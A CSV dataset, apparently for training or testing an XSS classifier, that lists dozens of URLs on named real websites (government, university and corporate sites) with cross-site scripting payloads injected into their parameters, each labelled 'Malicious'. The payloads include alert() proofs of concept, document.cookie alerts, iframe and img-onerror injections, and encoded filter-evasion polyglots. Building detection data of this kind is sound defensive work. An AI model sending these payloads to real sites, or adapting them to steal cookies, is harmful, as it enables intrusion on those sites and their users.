Sentence,Type
http://search.cancer.org/search?client=amcancer&amp;site=amcancer&amp;output=xml_no_dtd&amp;proxystylesheet=amca<br>ncer&amp;restrict=cancer&amp;q=%22%3e%3cscript%3ealert%28%27xss%27%29%3b%3c%2fscript%3e,Malicious
http://www.cancer.org/docroot/gry/gry_0.asp?txtsearch=%22%3e%3cscript%3ealert%28%27xss%27%29%3b%3c%2<br>fscript%3e&amp;dictionary=&amp;btngo.x=14&amp;btngo.y=12,Malicious
http://washingtondc.craigslist.org/search/sss?query='&quot;&gt;&lt;script&gt;alert('xss');&lt;/script&gt;,Malicious
http://www.phila.gov/redirect/redirect.asp?url='&quot;&gt;&lt;script&gt;alert('xss');&lt;/script&gt;,Malicious
http://ufcstore.resultspage.com/search?p=q&amp;srid=s2-3&amp;ts=v3&amp;lbc=ufcstore&amp;uid=463277334&amp;w=--%3e%3c%2fs<br>cript%3e%3cscript%3ealert%28document.cookie%29%3b%2f%2f&amp;search=search,Malicious
http://speakers.nvision2008.com/agenda/index.cfm?action=sessionsbyday&amp;d=3&amp;trackid=&amp;subcategoryid=&amp;se<br>ssionaudiencelevelid=-1&amp;sessiontypeid=-1&amp;keywords=%27%22%3e%3cscript%3ealert%28%27xss%27%29%3b%3c%2f<br>script%3e,Malicious
http://searchalaska.adn.com/sp?keywords=%27%22%3e%3cscript%3ealert%28%27xss%27%29%3b%3c%2fscript%3e&amp;<br>submit=find+%bb&amp;aff=1100,Malicious
http://textsearch.vrbo.com/search?q='&quot;&gt;&lt;script&gt;alert('xss');&lt;/script&gt;&amp;btng=go&amp;site=listingpages&amp;clie<br>nt=listingpages&amp;proxystylesheet=listingpages&amp;output=xml_no_dtd&amp;num=100&amp;getfields=vrbodesc.shortdesc.<br>location&amp;filter=0,Malicious
http://fundrace.huffingtonpost.com/neighbors.php?type=name&amp;lname=smith&amp;fname='&quot;&gt;&lt;script&gt;alert(docume<br>nt.cookie);&lt;/script&gt;&amp;search=search,Malicious
http://www.usmint.gov/index.cfm?flash='&quot;&gt;&lt;script&gt;alert('xss');&lt;/script&gt;,Malicious
http://googlesearch.insurance.ca.gov/search?textsize=default.css&amp;searchreturl=http%3a%2f%2fwww.insur<br>ance.ca.gov%2f&amp;client=default_frontend&amp;proxystylesheet=default_frontend&amp;output=xml_no_dtd&amp;site=defau<br>lt_collection&amp;restrict=&amp;q=%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%5c%27%3balert<br>%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%22%3balert%28string.fromcharcode%2888%2c83%2c83%29<br>%29%2f%2f%5c%22%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f--%3e%3c%2fscript%3e%22%3e%2<br>7%3e%3cscript%3ealert%28string.fromcharcode%2888%2c83%2c83%29%29%3c%2fscript%3e&amp;x=11&amp;y=5,Malicious
http://education.powys.gov.uk/cgi-bin/htsearch?config=sarahr2&amp;restrict=.php%7c.htm%7c.pdf%7c.jpg%7c.<br>doc&amp;exclude=%2fforms%7c%2ftemplates%7c%2fcymraeg%7c%2fdatabase%7c%2fsearch2&amp;method=and&amp;format=t1&amp;wor<br>ds=%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%5c%27%3balert%28string.fromcharcode%<br>2888%2c83%2c83%29%29%2f%2f%22%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%5c%22%3balert<br>%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f--%3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert%2<br>8string.fromcharcode%2888%2c83%2c83%29%29%3c%2fscript%3e&amp;submit=search+again,Malicious
"https://welcome.intel.com/login.aspx?target=';alert(string.fromcharcode(88,83,83))//\';alert(string.<br>fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromcharcode(88<br>,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e",Malicious
http://developer.apple.com/cgi-bin/search.pl?q=%3e%22%3e%3cscript%3ealert(%22xss%22)%3c/script%3e&amp;nu<br>m=10&amp;site=default_collection,Malicious
http://www.specialolympics.org/special+olympics+public+website/english/contact_us/process_feedback.h<br>tml,Malicious
http://www.cynthiasays.com/fulloptions.asp?browse_emul=cynthia+1.0&amp;rptmode=%2d1&amp;url1=%22%3e%3cscript<br>%3ealert%28%27cynthia+says%3a+i+have+xss+issues%21%27%29%3b%3c/script%3e&amp;emsg=%0d%0a%3cbr%3ethe+url%<br>3a+%22%3e%3cscript%3ealert%28%27cynthia+says%3a+i+have+xss+issues%21%27%29%3b%3c/script%3e+has+an+un<br>supported+url+scheme.++url+entries+must+start+with+either+%27http%3a//%27+or+%27https%3a//%27.&lt;scrip<br>t&gt;alert('even%20the%20error%20message%20itself%20is%20vulnerable!');&lt;/script&gt;,Malicious
http://www.financialexpress.com/search/news//'/%22%3e%3cscript%3ealert(document.cookie);%3c/script%3<br>e/,Malicious
"http://www.austrade.gov.au/performsearch.aspx?articleid=4345&amp;moduleid=8367&amp;keywords=';alert(string.f<br>romcharcode(88,83,83))//\';alert(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83<br>,83))//\%22;alert(string.fromcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(stri<br>ng.fromcharcode(88,83,83))%3c/script%3e",Malicious
"http://pbma.hq.nasa.gov/index.php?fuseaction=pbma.faqpro&amp;action=search&amp;q=';alert(string.fromcharcode<br>(88,83,83))//\';alert(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22<br>;alert(string.fromcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromchar<br>code(88,83,83))%3c/script%3e",Malicious
"http://vincent.amd.com/it-it/countrylanguage/0,,3,00.html?amdworldflg=';alert(string.fromcharcode(88<br>,83,83))//\';alert(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;al<br>ert(string.fromcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcod<br>e(88,83,83))%3c/script%3e",Malicious
http://usato-articoli-sportivi.vivastreet.alice.it/;&lt;script&gt;alert(123)&lt;/script&gt;usato-articoli-sportivi,Malicious
http://anscigallery.nal.usda.gov/search.php?action=basic&amp;keywords=%27%3balert%28string.fromcharcode%<br>2888%2c83%2c83%29%29%2f%2f%5c%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%22%3balert<br>%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%5c%22%3balert%28string.fromcharcode%2888%2c83%2c83<br>%29%29%2f%2f--%3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2888%2c83%2c83%2<br>9%29%3c%2fscript%3e&amp;search_options%5b%5d=display_name&amp;search_options%5b%5d=subject_keywords&amp;search_o<br>ptions%5b%5d=description&amp;search_options%5b%5d=original_creator&amp;search_options%5b%5d=digital_creator&amp;<br>search_options%5b%5d=publisher&amp;search_options%5b%5d=source_relation&amp;search_options%5b%5d=spatial_loc<br>ation&amp;search_options%5b%5d=language&amp;submit=begin+search,Malicious
"http://www.ubuntu.com/getubuntu/downloading?release=desktop-newest&amp;arch=amd64&amp;mirror=';alert(string.<br>fromcharcode(88,83,83))//\';alert(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,8<br>3,83))//\%22;alert(string.fromcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(str<br>ing.fromcharcode(88,83,83))%3c/script%3e&amp;debug=&amp;download-button=",Malicious
http://www.health.gov.ls/home/search.php?searchword=%27%3balert%28string.fromcharcode%2888%2c83%2c83<br>%29%29%2f%2f%5c%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%22%3balert%28string.from<br>charcode%2888%2c83%2c83%29%29%2f%2f%5c%22%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f--<br>%3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2888%2c83%2c83%29%29%3c%2fscri<br>pt%3e&amp;b1=search,Malicious
http://www.e-gov.gr/search.php?query=%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%5c<br>%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%22%3balert%28string.fromcharcode%2888%2<br>c83%2c83%29%29%2f%2f%5c%22%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f--%3e%3c%2fscript<br>%3e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2888%2c83%2c83%29%29%3c%2fscript%3e&amp;topic=37&amp;<br>category=0&amp;author=&amp;days=0&amp;type=stories,Malicious
http://gdr.leonardo.it/extremelot/personaggio/crea.asp?f=11&amp;m=1&amp;n=%3e%22%3e%3cscript%3ealert(%22xss%<br>22)%3c/script%3e,Malicious
"http://bill.paiz.gov.pl/brownfields/showoffer.php?idoffer=';alert(string.fromcharcode(88,83,83))//\'<br>;alert(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.f<br>romcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))<br>%3c/script%3e",Malicious
"http://www.bnm.gov.my/index.php?tpl_id=118&amp;lang=';alert(string.fromcharcode(88,83,83))//\';alert(str<br>ing.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromcharcod<br>e(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script<br>%3e",Malicious
"http://www.ur.gov.lv/index.php?t=5&amp;v=eng&amp;m=';alert(string.fromcharcode(88,83,83))//\';alert(string.f<br>romcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromcharcode(88,<br>83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e&amp;m<br>eklet3.x=18&amp;meklet3.y=13",Malicious
"http://search.google.dot.gov/rita/ritasearchprocess.asp?site';alert(string.fromcharcode(88,83,83))//<br>\';alert(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string<br>.fromcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83<br>))%3c/script%3e",Malicious
"http://nindssearch.ninds.nih.gov/publicsearch/index.jsp?querytext=';alert(string.fromcharcode(88,83,<br>83))//\';alert(string.fromcharcode(88,83,83))//&quot;;alert(string.fromcharcode(88,83,83))//\&quot;;alert(stri<br>ng.fromcharcode(88,83,83))//--&gt;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/script&gt;",Malicious
http://www.nrcu.gov.ua/sub/rec_sub.php?lng=&amp;email=%27%3balert%28string.fromcharcode%2888%2c83%2c83%2<br>9%29%2f%2f%5c%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%22%3balert%28string.fromch<br>arcode%2888%2c83%2c83%29%29%2f%2f%5c%22%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f--%3<br>e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2888%2c83%2c83%29%29%3c%2fscript<br>%3e&amp;sel_sub=sublng=&amp;email=%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%5c%27%3balert<br>%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%22%3balert%28string.fromcharcode%2888%2c83%2c83%29<br>%29%2f%2f%5c%22%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f--%3e%3c%2fscript%3e%22%3e%2<br>7%3e%3cscript%3ealert%28string.fromcharcode%2888%2c83%2c83%29%29%3c%2fscript%3e&amp;sel_sub=sub,Malicious
http://search.access.gpo.gov/eeoc/searchright.asp?ct=eeoc&amp;q1=%27%3balert%28string.fromcharcode%2888%<br>2c83%2c83%29%29%2f%2f%5c%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%22%3balert%28st<br>ring.fromcharcode%2888%2c83%2c83%29%29%2f%2f%5c%22%3balert%28string.fromcharcode%2888%2c83%2c83%29%2<br>9%2f%2f--%3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2888%2c83%2c83%29%29%<br>3c%2fscript%3e,Malicious
"http://bibliotecas.salud.gob.mx/cgi-bin/library?site=localhost&amp;a=p&amp;p=about&amp;c=';alert(string.fromchar<br>code(88,83,83))//\';alert(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//<br>\%22;alert(string.fromcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.from<br>charcode(88,83,83))%3c/script%3e",Malicious
"http://pbma.hq.nasa.gov/index.php?fuseaction=pbma.faqpro&amp;action=';alert(string.fromcharcode(88,83,83<br>))//\';alert(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(st<br>ring.fromcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,8<br>3,83))%3c/script%3e",Malicious
"http://appel.nasa.gov/ask/archives/lessons.php?lesson=';alert(string.fromcharcode(88,83,83))//\';ale<br>rt(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromc<br>harcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/<br>script%3e",Malicious
"http://forecast.msn.co.il/msn/israel_for.php?file=';alert(string.fromcharcode(88,83,83))//\';alert(s<br>tring.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromcharc<br>ode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/scri<br>pt%3e",Malicious
"http://horoscopes.msn.co.uk/horoscopes_astrology/horoscopes.php?sign=';alert(string.fromcharcode(88,<br>83,83))//\';alert(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;ale<br>rt(string.fromcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode<br>(88,83,83))%3c/script%3e",Malicious
"http://modis-atmos.gsfc.nasa.gov/staff.php?sup_id=15&amp;sidact=';alert(string.fromcharcode(88,83,83))//<br>\';alert(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string<br>.fromcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83<br>))%3c/script%3e",Malicious
http://www.fish4.co.uk/cs/dstyahoo/jobs/result?searchkey=search_id_jobs&amp;sort=0&amp;job_title=%27%3balert<br>%28string.fromcharcode%2888&amp;location=%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%5c<br>%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%22%3balert%28string.fromcharcode%2888%2<br>c83%2c83%29%29%2f%2f%5c%22%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f--%3e%3c%2fscript<br>%3e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2888%2c83%2c83%29%29%3c%2fscript%3e&amp;x=49&amp;y=9,Malicious
http://mapserver3.ldpassociati.it/siena/portale/gloss_norm/glossario.cfm?cod_cla=2&amp;cod_sottocla=1&amp;de<br>scri_sottocla=%3e%22%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://suapsi.comune.siena.it/supera/jsp/home.do?sportello=%3e%22%3e%3cscript%3ealert(%22xss%22)%3c/<br>script%3e,Malicious
http://www.saopaulo.sp.gov.br/sis/searchwww.php?qu=%22%3e%3cscript%3ealert(/xss/);%3c/script%3e,Malicious
http://www.ibge.gov.br/home/pesquisa/pesquisa.php?palavras=%22%3e%3cscript%3ealert%28/xss/%29%3b%3c%<br>2fscript%3e,Malicious
http://www.bndes.gov.br/english/busca/resultado.asp?operacao=novabusca&amp;fdpesquisa=%3cscript%3ealert%<br>281%29%3c%2fscript%3e,Malicious
http://www1.caixa.gov.br/busca/asp/resultado_busca.asp?q1=%3cscript%3ealert(/xss/);%3c/script%3e,Malicious
http://search.usda.gov/search?q=%22%3e%3cscript%3ealert%28%2fxss%2f%29%3b%3c%2fscript%3e&amp;btng.x=12&amp;b<br>tng.y=16&amp;btng=go%21&amp;btng=go%21&amp;filter=0&amp;as_sitesearch=ars.usda.gov&amp;ie=&amp;output=xml_no_dtd&amp;client=usda<br>&amp;lr=&amp;proxystylesheet=ars&amp;oe=,Malicious
http://www.senasa.gov.ar/buscador.php?q=%27%3e%3cscript%3ealert%28%2fxss%2f%29%3b%3c%2fscript%3e,Malicious
http://www.cmd.gov.ar/buscador/?buscar=%22%3e%3cscript%3ealert(/xss/);%3c/script%3e,Malicious
http://www.inadi.gov.ar/buscador_resultados_listado.php?q=%22%3e%3cscript%3ealert%28%2fxss%2f%29%3b%<br>3c%2fscript%3e,Malicious
http://www.agenciacordobaciencia.cba.gov.ar/buscar.asp?txtbuscar_1=%22%3e%3cscript%3ealert(/xss/);%3<br>c/script%3e,Malicious
http://www.sanfernando.gov.ar/buscador_procesar.asp?pbuscar=%22%3e%3cscript%3ealert(/xss/);%3c/scrip<br>t%3e,Malicious
http://www.legiscba.gov.ar/do_searchbk.asp?search_fields=%3cscript%3ealert(/xss/);%3c/script%3e,Malicious
http://www.riogrande.gov.ar/index.php?s=www523xv7pcrptc$$buscar/inicio&amp;l=es,Malicious
http://www.pjn.gov.ar/buscador.php?texto=%22%3e%3cscript%3ealert(/xss/);%3c/script%3e,Malicious
http://www.concordia.gov.ar/princ_busqueda_result.php?keyword=%3c/title%3e%3cscript%3ealert(/xss/);%<br>3c/script%3e%3ctitle%3e,Malicious
http://www.sernam.gov.cl/publico/buscador.php?cadena=%3cscript%3ealert(/xss/);%3c/script%3e,Malicious
http://www.fonasa.gov.cl/prontus_fonasa/antialone.html?page=http://xssed.org&quot;onmouseover=&quot;alert(1)&quot;,Malicious
http://search.mit.edu/search?q=%22%3e%3cscript%3ealert%28%2fxss%2f%29%3b%3c%2fscript%3e&amp;btng.x=0&amp;btn<br>g.y=0&amp;site=mit&amp;client=mit&amp;proxystylesheet=http%3a%2f%2fspruce-goose.csail.mit.edu%2fsearch%2fgoogle-<br>csail.xsl&amp;output=xml_no_dtd&amp;as_dt=i&amp;as_oq=site%3awww.csail.mit.edu%20site%3apublications.csail.mit.e<br>du,Malicious
http://www.pri.senado.gob.mx/index.php?actual_sm=2&amp;ido=8&amp;cadena=%3cscript%3ealert('xss');%3c/script%<br>3e,Malicious
http://oeidrus.jalisco.gob.mx/servicios/libre.asp?id=%3cscript%3ealert(/xss/);%3c/script%3e,Malicious
http://www.indicadoresmqro.gob.mx/index.html?pag=http://xssed.org,Malicious
http://sexoffenders.ehawaii.gov/sexoff/list.jsp?sor_record_type=so&amp;lname=%3cscript%3ealert(/xss/);%3<br>c/script%3e&amp;fname=%3cscript%3ealert(/xss/);%3c/script%3e&amp;zip=%3cscript%3ealert%28%2fxss%2f%29%3b%3c%<br>2fscript%3e&amp;street=%3cscript%3ealert%28%2fxss%2f%29%3b%3c%2fscript%3e,Malicious
http://www.ecologie.gouv.fr/spip.php?action=cookie&amp;url=java:'%22/%3e%3cscript%3ealert('hello%20the%2<br>0rat')%3c/script%3e,Malicious
http://www.bougezautrement.gouv.fr/bougezautrement/spip.php?action=cookie&amp;url=java:%22/%3e%3cscript%<br>3ealert('hello%20the%20rat')%3c/script%3e,Malicious
http://www.bourgogne.ecologie.gouv.fr/spip.php?action=cookie&amp;url=java:%22/%3e%3cscript%3ealert('hell<br>o%20the%20rat')%3c/script%3e,Malicious
http://www.coe.gouv.fr/spip.php?action=cookie&amp;url=java:%22/%3e%3cscript%3ealert('hello%20the%20rat')<br>%3c/script%3e,Malicious
http://www.ddm.gouv.fr/surfezintelligent/spip.php?action=cookie&amp;url=java:%22/%3e%3cscript%3ealert('h<br>ello%20the%20rat')%3c/script%3e,Malicious
http://www.cniae.gouv.fr/spip.php?action=cookie&amp;url=java:%22/%3e%3cscript%3ealert('hello%20the%20rat<br>')%3c/script%3e,Malicious
http://www.lorraine.ecologie.gouv.fr/spip.php?action=cookie&amp;url=java:%22/%3e%3cscript%3ealert('hello<br>%20the%20rat')%3c/script%3e,Malicious
http://www.grippe-aviaire.gouv.fr/monquotidienenpandemie/spip.php?action=cookie&amp;url=java:%22/%3e%3cs<br>cript%3ealert('hello%20the%20rat')%3c/script%3e,Malicious
http://www.ac-creteil.fr/jahia/jahia/enginename/search/accueil/recherches?search=%22%27%2f%3e%3cscri<br>pt%3ealert%28%27hello+the+rat%27%29%3c%2fscript%3e&amp;maxpageitems=10&amp;pagesearchresultbuilder.onlyonehi<br>tbypage=false&amp;searchview=simple&amp;freesearch=&amp;searchlang=all_lang,Malicious
http://pouvoirslocaux.wallonie.be/jahia/jahia/enginename/search/pid/2?search=%22%27%2f%3e%3cscript%3<br>ealert%28%27hello+the+rat%27%29%3c%2fscript%3e&amp;maxpageitems=10&amp;pagesearchresultbuilder.onlyonehitbyp<br>age=false&amp;searchview=simple&amp;freesearch=&amp;searchhandler=search&amp;go=rechercher,Malicious
https://studies2.hec.fr/jahia/jahia/enginename/search/pid/1?maxpageitems=10&amp;pagesearchresultbuilder.<br>onlyonehitbypage=true&amp;searchview=simple&amp;screen=execute&amp;freesearch=&amp;searchrefineattribute=reset&amp;searc<br>hhandler=search&amp;search=%22%27%2f%3e%3cscript%3ealert%28%27hello+the+rat%27%29%3c%2fscript%3e&amp;go.x=9&amp;<br>go.y=10,Malicious
http://www.ac-rennes.fr/jahia/jahia/enginename/search/site/academie2/accueil?search=%22%27%2f%3e%3cs<br>cript%3ealert%28%27hello+the+rat%27%29%3c%2fscript%3e&amp;maxpageitems=10&amp;pagesearchresultbuilder.onlyon<br>ehitbypage=true&amp;searchview=simple&amp;screen=execute&amp;freesearch=&amp;searchrefineattribute=reset&amp;searchhandl<br>er=search&amp;go.x=7&amp;go.y=10&amp;go=rechercher,Malicious
"http://sourceforge.net/search/?type_of_search=soft&amp;words=aa&amp;pmode=%22'/%3e%3cscript%3ealert(string.f<br>romcharcode(72,101,108,108,111,32,84,104,101,32,82,97,116))%3c/script%3e",Malicious
"http://bnpparibasnet.solution.weborama.fr/fcgi-bin/performance.fcgi?id=144092&amp;a=1&amp;l=109633&amp;c=5531&amp;p=<br>4543&amp;t=i&amp;bounce=ok&amp;brnd=39765&amp;url=data:text/html;charset=utf-7;base64,k0fedy1zy3jpchqrquq0lwfszxj0kd<br>epk0fecy1oaxn0b3j5lmjhy2sokstbrhnbueetl3njcmlwdctbrdqt",Malicious
http://search.cnn.com/search?query=aaa&amp;type=web&amp;sortby=date&amp;intl=false&amp;currentpage=2&amp;nt=&quot;'/&gt;&lt;script&gt;<br>alert('hello the rat')&lt;/script&gt;,Malicious
"http://shopping.uol.com.br/eletronicos/som-portatil/index.html?id=%22%27/%3e%3cscript%3ealert(string<br>.fromcharcode(72,101,108,108,111,32,84,104,101,32,82,97,116))%3c/script%3e&amp;pagetp=1&amp;cliquecompare=1",Malicious
"http://www.dailymotion.com/logout?urlback=data:text/html,&lt;html&gt;&lt;head&gt;&lt;%2fhead&gt;&lt;body&gt;&lt;script&gt;alert('h<br>ello the rat')&lt;%2fscript&gt;&lt;%2fbody&gt;&lt;%2fhtml&gt;",Malicious
https://store.adobe.com/cgi-bin/webobjects/wec.woa/19;&lt;script&gt;alert(123)&lt;/script&gt;/wo/otjm3o1ebtibadrhcz2kiw/10.14,Malicious
http://civs.gouv.fr/spip.php?action=cookie&amp;url=java:%22/%3cscript%3ealert('hello%20the%20rat')%3c/sc<br>ript%3e,Malicious
http://photos.lequipe.fr/index_recherche.php?recherche=%22'/%3e%3cimg%20src=.%20onerror=alert(docume<br>nt.cookie)%20%3e&amp;submit=ok%a0,Malicious
http://photobucket.com/images/love%20or%20kiss%20icons/?source=%22'/%3e%3cscript%3ealert('hello the<br>rat')%3c/script%3e,Malicious
http://www.ofsted.gov.uk/content/advancedsearch/summary?searchtext='&quot;&gt;&lt;script&gt;alert('www.xssed.com')<br>&lt;/script&gt;,Malicious
http://www.guardianholidayoffers.co.uk/search?search=&quot;<br>style=background:url(http://data.xssed.org/images/xssed_logo.gif);width:500px;height:500px;position:<br>absolute;left:0;top:0;z-index:1000 onmouseover=alert(document.cookie) &quot;,Malicious
http://www.ford.de/cs/contentserver?pagename=dede2_engine/layoutdl&amp;c=page&amp;cid=1204902950643&amp;addresss<br>earchstring=');&lt;/script&gt;&lt;iframe<br>src=&quot;http://xssed.com&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(navigator.useragent)&lt;/script&gt;,Malicious
"http://www.ey.com/de/de/searchresults?query=\');%0adocument.write(string.fromcharcode(60, 105, 109,<br>103, 32, 115, 114, 99, 61, 104, 116, 116, 112, 58, 47, 47, 100, 97, 116, 97, 46, 120, 115, 115, 101,<br>100, 46, 111, 114, 103, 47, 105, 109, 97, 103, 101, 115, 47, 120, 115, 115, 101, 100, 95, 108, 111,<br>103, 111, 46, 103, 105, 102, 32, 111, 110, 108, 111, 97, 100, 61, 97, 108, 101, 114, 116, 40, 100,<br>111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101, 41, 62))%0a//",Malicious
https://www.t-mobile.de/wotan/hugin/orderstatusresult.html?ordernumber=&lt;img<br>src=http://data.xssed.org/images/xssed_logo.gif onload=alert(document.cookie)//,Malicious
http://search.avg.com/route/?q=%3c/script%3e%3cimg%20src=http://data.xssed.org/images/xssed_logo.gif<br>%20onload=alert%28navigator.useragent%29//,Malicious
